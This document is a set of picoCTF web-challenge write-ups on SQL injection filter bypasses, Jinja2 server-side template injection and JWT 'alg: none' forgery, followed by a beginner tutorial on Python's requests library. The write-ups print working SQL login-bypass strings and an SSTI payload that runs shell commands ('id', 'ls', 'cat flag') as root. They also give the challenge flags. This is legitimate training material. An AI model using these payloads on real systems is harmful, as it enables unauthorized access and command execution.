# Web Gauntlet
> Can we beat the filters?
Log in as admin http://shape-facility.picoctf.net:65336/ http://shape-facility.picoctf.net:65336/filter.php

## Solution:

### round 1 (blocked: or)
- input random into the field to see what happens
<img width="998" height="716" alt="image" src="https://github.com/user-attachments/assets/ec08a20d-f917-46b7-8c02-f3996be3a1b2" />

- From this we can interpret that the website uses SQL
- we simply use `--` to comment out the rest of the code. user - `admin' --` 
```
SELECT * FROM users WHERE username='admin' --' AND password='a'
```

### round 2 (blocked:  or and like = --)
- here `--` is blocked but we have another way to comment - `/*`to start the comment and  `'*/` to end the comment
```
admin' /*
```

### round 3 (blocked: or and = like > < --)
- `;` can be used to terminate the sql query
```
admin';
```

### round 4 (blocked: or and = like > < -- admin)
- everything is blocked now
- concatenation works so I can
```
ad'||'min';
```

### round 5 (blocked: or and = like > < -- union admin)
- same as round 4
```
ad'||'min';
```

### Final
checking the filter.php to find the flag 
`
// picoCTF{y0u_m4d3_1t_79a0ddc6}
`

## Flag:
```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

## Concepts learnt:
- SQL basic commands
- Exploiting a database using SQL injection


## Resources: 
- (https://www.w3schools.com/sql/sql_comments.asp)
- (https://portswigger.net/web-security/sql-injection)
- (https://owasp.org/www-community/attacks/SQL_Injection)

***


# SSTI1
> I made a cool website where we can announce whatever we want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

## Solution:

- I tried the common expressions `7*9`, `${7*9}`, `{{7*9}}`, `=<%= 7*9 %>`
- `7*9`, `${7*9}` and `=<%= 7*9 %>` gave the output `7*9`, `${7*9}` and `=<%= 7*9 %>` respectively
- But `{{7*9}}` actually executed the code and gave output `63`
- This implies that it executes Jinja2 (Python) code
- I looked up "how to ssti python" and found a bunch of commands which are as follows
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
- I found this payload that can execute commands and running it gives
```
uid=0(root) gid=0(root) groups=0(root)
```
- so my payload code is working and I can input anything I want...
- running the `ls` command using `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}` gave output
```
__pycache__ app.py flag requirements.txt
```
- next logical step is to obviously `cat flag` using `{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}` which gives us the flag
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
```

## Flag:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
```

## Concepts learnt:

- server-side template injection attack (SSTI) is when a hacker exploits and injects malicious payloads into the website.
- It can allow hackers to gain full control of a targeted server. 


## Resources:

- (https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/)
- (https://onsecurity.io/article/server-side-template-injection-with-jinja2/)


***



# JAuth

Most web application developers use third party components without testing their security. Some of the past affected companies are:

Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
VerticalScope (internet media company) - outdated version of vBulletin forum software used
Can we identify the components and exploit the vulnerable one?

hint
- Use the web browser tools to check out the JWT cookie.
- The JWT should always have two (2) . separators.

## solve

- save password stores the credentials in teh cookie
- decode the jwt cookie in https://www.jwt.io/
![alt text](/images/image.png)

edit the token using the encode feature
![alt text](/images/image-1.png)

enter the altered jwt token in the cookie
![alt text](/images/image-2.png)

## Flag:
```
picoCTF{succ3ss_@u7h3nt1c@710n_3444eacf}
```

## explaination 

When a backend library is misconfigured, it may trust the alg field specified in the JWT header. The JWT specification includes a "none" algorithm meant for unsigned tokens (used when signature verification is handled elsewhere). If the server accepts "alg": "none", it skips signature verification entirely.




# Python's Requests Library

## 1. Get Started
The `requests` library is the standard for making HTTP requests in Python. It abstracts the complexities of the built-in `urllib`


```bash
$ python -m pip install requests
```

```python
import requests
```


## 2. GET Request

```python
response = requests.get("https://api.github.com")
```
This returns a `Response` object containing the server's response to the HTTP request.


## 3. Inspect the Response
A `Response` object is packed with useful information, methods, and attributes that allow we to inspect the results of wer request.

### Status Codes
Status codes inform we whether the request was successful, failed, or requires further action.
- 200 OK: The request was successful.
- 404 Not Found: The requested resource does not exist.

we can check the status code using the `.status_code` attribute:
```python
print(response.status_code)  # Output: 200
```
Additionally, `requests` evaluates `Response` objects in a Boolean context. If the status code is between 200 and 399, it evaluates to `True`. To explicitly raise an exception for HTTP errors (4xx and 5xx), we can use `.raise_for_status()`:
```python
response.raise_for_status()
```

### Access the Response Content
The data returned by the server is known as the payload. we can access it in various formats:
- Raw Bytes: `response.content` gives we the raw bytes of the payload.
- string / text: `response.text` decodes the payload into a string 
- JSON: If the response is JSON, we can use the `.json()` method to immediately parse it into a Python dictionary.

```python
data = response.json()
print(data["current_user_url"])
```

### View Response Headers
Headers contain metadata about the response, such as content type and caching rules. we can access them via the `.headers` attribute, which acts as a case-insensitive dictionary:
```python
content_type = response.headers['Content-Type']
```



## 4. Add Query String Parameters
When making GET requests, we often need to pass data in the URL's query string (e.g., `?q=python`). With `requests`, we can pass a dictionary to the `params` parameter:

```python
response = requests.get(
    "https://api.github.com/search/repositories",
    params={"q": "requests+language:python"}
)
```



## 5. Customize Request Headers
Sometimes we need to send custom headers, such as accepting specific content types or providing metadata to the server. we can do this by passing a dictionary to the `headers` argument:

```python
headers = {"Accept": "application/vnd.github.v3.text-match+json"}
response = requests.get("https://api.github.com", headers=headers)
```



## 6. Use Other HTTP Methods
Aside from `GET`, the `requests` library supports all standard HTTP methods seamlessly:
- **POST**: `requests.post()`
- **PUT**: `requests.put()`
- **DELETE**: `requests.delete()`
- **HEAD**: `requests.head()`
- **PATCH**: `requests.patch()`
- **OPTIONS**: `requests.options()`



## 7. Send Request Data
When using methods like `POST` or `PUT`, we often need to send data to the server.
- form data: Use the `data` parameter to send form-encoded data (a dictionary or a list of tuples).
- JSON Data: Modern APIs often require JSON data. we can pass a Python dictionary directly to the `json` parameter, and `requests` will set the `Content-Type` header to `application/json`.

```python
response = requests.post("https://httpbin.org/post", json={"key": "value"})
```



## 8. Inspect the Prepared Request
Before a request is sent to the server, `requests` compiles all the data (headers, body, URL) into a `PreparedRequest` object. we can inspect this by accessing `response.request`:

```python
print(response.request.headers)
print(response.request.body)
```
This is extremely useful for debugging and verifying exactly what data was sent over the wire.



## 9. Use Authentication
Many APIs require authentication. The `requests` library supports various authentication methods. 
For basic HTTP authentication, we can pass a tuple of `(username, password)` to the `auth` parameter:

```python
from requests.auth import HTTPBasicAuth

requests.get("https://api.github.com/user", auth=("username", "password"))
```
Other forms, such as Bearer tokens, can be passed directly via custom headers.



## 10. Communicate Securely With Servers
Security is a paramount concern. `requests` verifies SSL certificates for HTTPS requests by default using the `certifi` package. If a certificate is invalid, it throws an `SSLError`. we can override this by passing `verify=False` (not recommended for production).



## 11. Improve Performance
When building robust applications, network performance and reliability are critical. `requests` provides tools to handle timeouts, reuse connections, and manage retries.

### Set Request Timeouts
By default, `requests` will hang indefinitely if a server does not respond. It is a best practice to always specify a timeout:
```python
response = requests.get("https://api.github.com", timeout=3.05)
```

### Reuse Connections With Session Objects
Making multiple requests to the same host using `requests.get()` opens and closes a new TCP connection every time. Using a `Session` object allows connection pooling and drastically improves performance by reusing underlying TCP connections. Furthermore, a `Session` object persists parameters (like cookies and headers) across requests.

```python
with requests.Session() as session:
    session.headers.update({"Authorization": "Bearer weR_TOKEN"})
    
    response_one = session.get("https://api.github.com/user")
    response_two = session.get("https://api.github.com/user/repos")
```

### Retry Failed Requests
Transient network errors happen. we can implement automatic retries by mounting a custom `HTTPAdapter` configured with a `Retry` strategy to a `Session` object:

```python
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

session = requests.Session()
retry = Retry(connect=3, backoff_factor=0.5)
adapter = HTTPAdapter(max_retries=retry)
session.mount("http://", adapter)
session.mount("https://", adapter)

session.get("https://api.github.com")
```

